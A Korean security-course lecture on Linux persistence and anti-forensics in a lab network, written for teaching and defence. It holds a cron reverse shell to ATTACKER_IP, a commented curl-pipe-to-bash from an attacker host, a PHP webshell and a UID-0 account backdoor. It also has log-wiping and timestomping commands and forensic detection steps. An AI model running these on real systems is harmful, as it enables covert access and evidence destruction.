# Week 12: 지속성 확보 + 안티포렌식

## 학습 목표
- 5가지 Linux 지속성(Persistence) 기법의 원리와 ATT&CK 매핑을 설명한다
- SSH 키 인젝션, cron 백도어, systemd 서비스, `.bashrc`, 계정 생성을 실습한다
- 안티포렌식 기법(히스토리 비활성, 로그 삭제, 타임스탬프 조작, 메모리 실행)을 체험한다
- 방어자 관점에서 포렌식 타임라인 재구성 절차를 수행한다
- 각 지속성 기법의 탐지 지점(FIM·cron 감사·systemctl·/etc/passwd)을 정리한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 공격자 (Bastion :8003) |
| web | 10.20.30.80 | 표적 (sudo NOPASSWD:ALL) |
| siem | 10.20.30.100 | Wazuh FIM (탐지 확인) |

> **⚠️ 윤리 규칙:** 이번 주 기법은 실습 환경에서만 사용. 실제 서버에 백도어 설치는 불법. 모든 실습은 **실습 후 제거**하는 단계를 반드시 수행.

## 강의 시간 배분 (3시간)

| 시간 | 내용 |
|------|------|
| 0:00-0:20 | 지속성 개념 + ATT&CK TA0003 (Part 1) |
| 0:20-1:10 | SSH키·cron·systemd 지속성 (Part 2) |
| 1:10-1:20 | 휴식 |
| 1:20-2:00 | `.bashrc`·계정 생성·웹셸 (Part 2 계속) |
| 2:00-2:40 | 안티포렌식 기법 (Part 3) |
| 2:40-2:50 | 휴식 |
| 2:50-3:20 | 방어자 포렌식 타임라인 (Part 4) |
| 3:20-3:40 | Bastion 자동화 + 과제 |

---

# Part 1: 지속성(Persistence) 개요

## 1.1 정의

**지속성(Persistence)**은 "초기 침투 후 재부팅·패스워드 변경에도 접근을 유지"하는 기법. MITRE ATT&CK **TA0003 Persistence** 전술.

```
초기 침투 → 권한 상승 → [지속성 설치] → 재접근 경로 확보
```

## 1.2 공격자 관점 가치

- 패스워드 변경 후에도 접근
- 취약점 패치 후에도 기존 경로 유지
- 장기 정보 수집 가능

## 1.3 방어자 관점 가치

침해 대응 시 **모든 지속성 경로를 발견·제거**하지 않으면 공격자 재침투. "패스워드 변경"만으로는 부족한 이유.

## 1.4 MITRE ATT&CK 매핑

| 이번 주 실습 | ATT&CK ID | 탐지 난이도 |
|-------------|-----------|-------------|
| SSH 키 인젝션 | T1098.004 SSH Authorized Keys | 낮음 (FIM) |
| cron 백도어 | T1053.003 Cron | 낮음 (crontab -l) |
| systemd 서비스 | T1543.002 Systemd Service | 중간 |
| `.bashrc` 수정 | T1546.004 Unix Shell Config Mod | 중간 |
| 계정 생성 | T1136.001 Local Account | 낮음 (/etc/passwd) |
| 로그 삭제 | T1070.002 Clear Linux/Mac Logs | 중간 |
| 타임스탬프 조작 | T1070.006 Timestomp | 중간 |
| 메모리 실행 | T1059.004 Unix Shell | 높음 |

---

# Part 2: 지속성 기법 실습

## 2.1 SSH 키 인젝션 (T1098.004)

**원리:** `~/.ssh/authorized_keys`에 공격자 공개키 추가 → 비밀번호 없이 SSH 접속. 비밀번호 변경 후에도 유지.

**방어 지점:** Wazuh FIM이 `authorized_keys` 변경 감시.

```bash
# 1. manager에서 백도어 키 생성
ssh-keygen -t ed25519 -f /tmp/week12_key -N "" -q
cat /tmp/week12_key.pub

# 2. web에 공개키 삽입
PUBKEY=$(cat /tmp/week12_key.pub)
ssh ccc@10.20.30.80 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '$PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# 3. 키 기반 접속 테스트 (패스워드 미입력)
ssh -i /tmp/week12_key -o StrictHostKeyChecking=no ccc@10.20.30.80 "whoami && date"
```

**예상 출력:**
```
ccc
Thu Apr 23 14:30:22 KST 2026
```

**정리 (필수):**
```bash
ssh ccc@10.20.30.80 "sed -i '/week12/d' ~/.ssh/authorized_keys"
rm -f /tmp/week12_key /tmp/week12_key.pub
```

## 2.2 Cron 백도어 (T1053.003)

**원리:** 주기 실행되는 cron job으로 리버스 셸·비콘 실행.

```bash
# 1. 설치 전 상태 확인
ssh ccc@10.20.30.80 "crontab -l 2>/dev/null || echo '(cron 없음)'"

# 2. 비콘 cron 설치 (안전한 버전 — 파일 기록만)
ssh ccc@10.20.30.80 '(crontab -l 2>/dev/null; echo "* * * * * echo \$(date) >> /tmp/beacon.log") | crontab -'

# 3. 1분 대기 후 동작 확인
sleep 65
ssh ccc@10.20.30.80 "cat /tmp/beacon.log"
```

**예상 출력:** 1분 간격 타임스탬프 누적.

**정리:**
```bash
ssh ccc@10.20.30.80 "crontab -l | grep -v 'beacon.log' | crontab -; rm -f /tmp/beacon.log"
```

**실제 공격 예시 (설치·실행 금지 — 개념 이해용):**
```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

## 2.3 systemd 서비스 (T1543.002)

**원리:** `/etc/systemd/system/`에 악성 .service 파일 → `enable`로 부팅 시 자동 시작.

```bash
# 설치 예시 (실습 서버에서만)
ssh ccc@10.20.30.80 << 'EOF'
sudo tee /etc/systemd/system/sysupdate.service > /dev/null << 'SVC'
[Unit]
Description=Fake System Update
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do date >> /tmp/svc_beacon.log; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
SVC

sudo systemctl daemon-reload
sudo systemctl enable --now sysupdate.service
sudo systemctl status sysupdate.service | head -5
EOF
```

**정리:**
```bash
ssh ccc@10.20.30.80 "sudo systemctl disable --now sysupdate.service; sudo rm /etc/systemd/system/sysupdate.service; sudo systemctl daemon-reload; sudo rm -f /tmp/svc_beacon.log"
```

## 2.4 Shell 설정 파일 수정 (T1546.004)

**원리:** 사용자 로그인 시 자동 실행되는 `~/.bashrc`, `~/.profile`, `/etc/profile.d/*.sh`에 악성 코드 추가.

```bash
# 설치
ssh ccc@10.20.30.80 << 'EOF'
cp ~/.bashrc ~/.bashrc.backup
echo "# sys_update" >> ~/.bashrc
echo "echo \"\$(date) login \$(hostname) \$(whoami)\" >> /tmp/login_beacon.log 2>/dev/null" >> ~/.bashrc
tail -3 ~/.bashrc
EOF

# 새 SSH 세션 → 비콘 동작
ssh ccc@10.20.30.80 "cat /tmp/login_beacon.log 2>/dev/null"
```

**정리:**
```bash
ssh ccc@10.20.30.80 "cp ~/.bashrc.backup ~/.bashrc; rm -f ~/.bashrc.backup /tmp/login_beacon.log"
```

## 2.5 사용자 계정 생성 (T1136.001)

**원리:** 새 계정 또는 UID 0 계정을 `/etc/passwd`에 추가.

```bash
# 일반 sudoer 계정 생성 (root 권한 필요 — sudo NOPASSWD로 가능)
ssh ccc@10.20.30.80 "sudo useradd -m -s /bin/bash -G sudo sysadmin; echo 'sysadmin:P@ssw0rd123' | sudo chpasswd"

# UID 0 백도어 (매우 위험 — 개념만)
# echo 'backdoor:$(openssl passwd -1 password123):0:0::/root:/bin/bash' | sudo tee -a /etc/passwd

# 확인
ssh ccc@10.20.30.80 "grep sysadmin /etc/passwd"
```

**정리:**
```bash
ssh ccc@10.20.30.80 "sudo userdel -r sysadmin 2>/dev/null; grep sysadmin /etc/passwd || echo '삭제 완료'"
```

## 2.6 웹셸 (개념)

PHP/JSP/ASP 파일을 웹 서버 업로드 디렉토리에 배치 → 브라우저로 명령 실행.

**JuiceShop은 Node.js 기반이라 PHP 실행 불가.** 하지만 악성 HTML·JS를 `/profile/image/file`로 업로드 시 XSS 지속 경로.

```php
<?php system($_GET['cmd']); ?>
```

사용: `http://target/uploads/shell.php?cmd=whoami`

---

# Part 3: 안티포렌식 (Anti-Forensics)

## 3.1 히스토리 비활성화 (T1070.003)

```bash
# 방법 1: HISTFILE 무효화 (현재 세션만)
export HISTFILE=/dev/null

# 방법 2: HISTSIZE 0
export HISTSIZE=0

# 방법 3: 히스토리 파일 비우기
cat /dev/null > ~/.bash_history && history -c

# 방법 4: 명령 앞 공백 (HISTCONTROL=ignorespace 조건)
 whoami    # ← 공백으로 시작 → 기록 안 됨 (설정 조건 필요)
```

## 3.2 로그 삭제 (T1070.002)

**주요 로그 파일:**
- `/var/log/auth.log` — SSH·sudo 기록 (텍스트)
- `/var/log/syslog` — 시스템 이벤트
- `/var/log/wtmp` — 로그인 기록 (바이너리)
- `/var/log/btmp` — 실패 로그인
- `/var/log/lastlog` — 마지막 로그인
- `journalctl` — systemd 통합 로그

```bash
# 특정 IP 관련 줄만 삭제 (더 은밀)
sudo sed -i '/10.20.30.200/d' /var/log/auth.log

# 전체 비우기 (공격 흔적이지만 아예 비어있는 것도 의심스러움)
sudo cat /dev/null > /var/log/auth.log

# 바이너리 로그
sudo cat /dev/null > /var/log/wtmp
sudo cat /dev/null > /var/log/btmp

# journal
sudo journalctl --vacuum-time=1s
```

**결과 해석:** 로그가 완전히 비어있거나 누락 구간이 있는 것 자체가 포렌식 조사관의 의심 신호.

## 3.3 타임스탬프 조작 (T1070.006)

```bash
# 테스트 파일
echo "test" > /tmp/timestamp_test
stat /tmp/timestamp_test | grep -E "Modify|Change"

# 특정 시간으로 변경
touch -t 202501010000 /tmp/timestamp_test
stat /tmp/timestamp_test | grep Modify

# 다른 파일의 시간으로 복사
touch -r /etc/hostname /tmp/timestamp_test
stat /tmp/timestamp_test | grep Modify
```

**제한:** `ctime`(메타데이터 변경 시간)은 `touch -t`로 변경 불가. `stat`의 Change 필드는 항상 현재 시간으로 업데이트 → **ctime vs mtime 불일치**가 공격 증거.

## 3.4 메모리 실행 (T1059.004)

`/dev/shm`은 tmpfs — 재부팅 시 사라짐, 디스크에 기록 안 됨.

```bash
echo '#!/bin/bash' > /dev/shm/memtool
echo 'echo "running from memory: PID=$$"' >> /dev/shm/memtool
chmod +x /dev/shm/memtool
/dev/shm/memtool
rm /dev/shm/memtool

# 더 은밀한 방식 — curl + pipe로 디스크 미저장
# curl -s http://attacker/script.sh | bash
```

---

# Part 4: 방어자 포렌식 타임라인

## 4.1 통합 점검 스크립트

```bash
ssh ccc@10.20.30.80 << 'FORENSIC'
echo "=== 1. 최근 로그인 ==="
last -10 2>/dev/null | head -5

echo "=== 2. SSH 인증 로그 (최근 Accepted/Failed) ==="
sudo grep -E "Accepted|Failed" /var/log/auth.log 2>/dev/null | tail -5

echo "=== 3. 최근 24시간 내 수정된 /etc 파일 ==="
find /etc -mtime -1 -type f 2>/dev/null | head -10

echo "=== 4. authorized_keys (user, root) ==="
cat ~/.ssh/authorized_keys 2>/dev/null | head -3
sudo cat /root/.ssh/authorized_keys 2>/dev/null | head -3

echo "=== 5. cron ==="
echo "-- user --" && crontab -l 2>/dev/null
echo "-- root --" && sudo crontab -l 2>/dev/null
echo "-- /etc/cron.d --" && ls -la /etc/cron.d/

echo "=== 6. UID 0 계정 ==="
awk -F: '$3==0 {print $1}' /etc/passwd

echo "=== 7. 최근 생성된 홈 디렉토리 ==="
ls -lt /home/ | head -5

echo "=== 8. 활성 systemd 서비스 (커스텀) ==="
systemctl list-unit-files --state=enabled | grep -v "vendor preset" | tail -10

echo "=== 9. /dev/shm, /tmp ==="
ls -la /dev/shm/ /tmp/ 2>/dev/null | head -15
FORENSIC
```

## 4.2 Wazuh FIM 활용

```bash
# Wazuh에서 authorized_keys, crontab, passwd 변경 감지
ssh ccc@10.20.30.100 \
  "sudo grep -iE 'authorized_keys|crontab|passwd' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -5"
```

**Wazuh 기본 FIM 설정:** `/etc/ssh/`, `/etc/passwd`, `/root/.ssh/` 감시 중. 백도어 설치 시 알림 발생.

---

# Part 5: Bastion 자동 침해 점검

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "web(10.20.30.80)의 지속성 메커니즘을 점검해줘: (1) ~/.ssh/authorized_keys의 모든 키, (2) user·root의 crontab, (3) /etc/cron.d 내용, (4) /etc/passwd의 UID 0 계정, (5) 활성 systemd 서비스 중 의심스러운 것, (6) ~/.bashrc의 추가된 라인. 각 항목의 발견사항과 제거 명령을 함께 제시해줘."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

---

## 과제 (다음 주까지)

### 과제 1: 지속성 5종 설치·확인·제거 (50점, 각 10점)
1. SSH 키 인젝션
2. cron 백도어
3. systemd 서비스
4. `.bashrc` 수정
5. 새 계정 생성

각 단계에 **설치 → 동작 확인 → 제거** 3단계 로그 제출. **반드시 제거 단계 스크린샷 포함.**

### 과제 2: 안티포렌식 시연 (20점)
- 히스토리 비활성화 + 세션 내 명령 실행 → `.bash_history` 확인
- 타임스탬프 조작 후 `stat`으로 ctime vs mtime 불일치 관찰
- `/dev/shm` 실행 후 파일 삭제 → 흔적 여부

### 과제 3: 방어자 타임라인 (30점)
과제 1에서 설치한 모든 메커니즘이 **남긴 흔적**을 찾아라:
- authorized_keys 변경 시간
- crontab 로그 (/var/log/syslog `CRON` 항목)
- .bashrc `ls -la --time=ctime`
- systemctl list-units 결과

→ 공격자가 안티포렌식을 사용했더라도 **어느 흔적이 남는가** 분석.

---

## 다음 주 예고

**Week 13: MITRE ATT&CK 종합 매핑**
- Week 02~12 전체 공격을 ATT&CK 기법으로 맵핑
- ATT&CK Navigator 시각화
- Heat map 작성

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **Persistence** | - | 재부팅·패스워드 변경 후에도 접근 유지 |
| **authorized_keys** | - | SSH 공개키 허용 목록 파일 |
| **T1098.004** | - | ATT&CK: SSH Authorized Keys |
| **T1053.003** | - | ATT&CK: Cron 활용 |
| **T1543.002** | - | ATT&CK: systemd Service |
| **T1546.004** | - | ATT&CK: Shell 설정 파일 수정 |
| **T1136.001** | - | ATT&CK: Local Account 생성 |
| **T1070.002** | - | ATT&CK: Linux/Mac 로그 삭제 |
| **T1070.006** | - | ATT&CK: Timestomp |
| **Timestomp** | - | 파일 타임스탬프 조작 (mtime/atime) |
| **FIM** | File Integrity Monitoring | 파일 변경 감시 (Wazuh 제공) |
| **Anti-Forensics** | - | 흔적 제거·포렌식 방해 기법 |
| **tmpfs** | - | 메모리 기반 파일시스템 (`/dev/shm`) |

---

## 📂 실습 참조 파일 가이드

### 핵심 명령어 (이번 주 사용)

| 명령 | 용도 |
|------|------|
| `ssh-keygen -t ed25519 -f 키 -N ""` | SSH 키 쌍 생성 |
| `ssh -i 키 user@host` | 키 기반 접속 |
| `crontab -l / -e` | cron 편집·조회 |
| `systemctl daemon-reload / enable / status` | 서비스 관리 |
| `useradd -m -s /bin/bash -G sudo` | 계정 생성 |
| `chpasswd` | 배치 패스워드 설정 |
| `find /etc -mtime -1` | 최근 수정 파일 |
| `last`, `lastlog` | 로그인 기록 |
| `journalctl --vacuum-time=1s` | journal 로그 삭제 |
| `touch -r ref 대상` / `-t` | 타임스탬프 조작 |

### 핵심 파일·디렉토리

| 경로 | 의미 |
|------|------|
| `~/.ssh/authorized_keys` | 공개키 허용 목록 |
| `/etc/crontab`, `/etc/cron.*/` | 시스템 cron |
| `/etc/systemd/system/*.service` | systemd 서비스 |
| `~/.bashrc`, `/etc/profile.d/` | 셸 진입 시 실행 |
| `/etc/passwd`, `/etc/shadow` | 계정 정보 |
| `/var/log/auth.log` | SSH·sudo 감사 |
| `/var/log/wtmp`, `btmp` | 로그인 바이너리 |
| `/dev/shm` | tmpfs (메모리 실행지) |

### Wazuh FIM (siem:10.20.30.100)

| 항목 | 설정 |
|------|------|
| 감시 경로 | `/etc/ssh/`, `/etc/passwd`, `/root/.ssh/`, `/home/*/.ssh/` |
| 로그 | `/var/ossec/logs/alerts/alerts.json` |
| 룰 | FIM 이벤트 시 rule_id 554/5501 등 트리거 |

### Bastion API (이번 주 사용)

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 지속성 점검 자동화 |
| GET | `/evidence?limit=N` | 점검 이력 |

---

> **실습 환경 검증 완료** (2026-03-28): web crontab·SSH키 설치/제거 실증, Wazuh FIM alert 수신 확인.

---

## 실제 사례 (WitFoo Precinct 6 — systemd_event + 7036/7040 service change)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *지속성 + 안티포렌식 (TA0003 Persistence + TA0005 Defense Evasion)* 학습 항목 (cron·systemd unit·service start/stop·log clearing) 과 매핑되는 dataset 의 systemd_event 34,520건 + 7036/7040 service event.

### Case 1: systemd_event (34,520건) + 7036/7040 service change

**dataset 분포**

| message_type | 의미 | 건수 |
|--------------|------|------|
| systemd_event | systemd unit lifecycle | 34,520 |
| 7036 | Service start/stop | 1,635 |
| 7040 | Service start type changed | 202 |
| 4985 | The state of a transaction has changed | 4,876 |
| **합계 (지속성/평가 관련)** | | **41,233** |

### Case 2: 4985 transaction state change — 안티포렌식 단서

dataset 의 4985 (4,876건) 는 *transaction state change* — Windows trustee 가 *권한 transaction* 을 commit/rollback. 비정상 패턴: 짧은 시간에 다수 transaction *rollback* → *권한 변경 후 흔적 제거* 의심.

**해석 — 본 lecture 와의 매핑**

| 지속성/안티포렌식 학습 항목 | 본 record 의 증거 |
|---------------------------|------------------|
| **systemd unit 지속성 (T1543.002)** | 34,520 systemd_event 가 정상 baseline. 점검 시 *비표준 unit name* (`apt-update.service` 위장) 검출 |
| **서비스 자동 시작 (T1543)** | 7040 (start type changed) 202건 — *드물게* 발생. Spike 시 *manual → automatic* 변경한 서비스 식별 (지속성 심기) |
| **로그 삭제 (T1070.001)** | (Linux journalctl 직접 부재) — 그러나 systemd_event 의 *대량 누락* 시점 확인 가능 (gap 분석) |
| **transaction rollback (T1070)** | 4985 spike — *권한 변경 후 rollback* 으로 audit trail 흐림 |
| **MITRE 매핑** | T1543.002 (systemd) + T1053.005 (Scheduled Task) + T1070 (Indicator Removal) |

**학생 실습 액션**:
1. 본인 Linux 환경에 systemd unit 지속성 심기 (`/etc/systemd/system/backdoor.service`) → journalctl 의 systemd_event spike 측정
2. 4985 baseline (4,876 / 2.07M = 0.24%) 대비 점검 환경 비율 — 5배 spike 시 *anti-forensic transaction* 의심
3. `journalctl --vacuum-time=1d` 실행 후 *gap 시간대* 가 SIEM 에 어떻게 보이는지 측정 (dataset 의 systemd_event 가 끊긴 구간 식별 방식 적용)


